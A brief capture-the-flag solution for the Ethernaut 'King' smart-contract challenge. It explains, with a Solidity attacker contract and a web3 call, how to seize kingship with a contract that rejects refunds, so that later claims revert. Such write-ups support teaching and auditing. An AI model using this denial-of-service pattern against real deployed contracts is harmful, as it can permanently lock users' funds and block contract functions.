make a contract be the king so that when ethernaut tries to reclaim kingship `king.transfer(msg.value);` will fail since the contract won't accept eth back.

```
pragma solidity ^0.8.0;

contract HackKing {
    function makeKing(address payable instance) public payable {
        instance.call{value: msg.value}("");
    }
}
```

```
const abi = ...;
const hackKingContract = new web3.eth.Contract(abi, '<contract address>');
hackKingContract.methods.makeKing(instance).send({ from: player, value: toWei('1')});
```
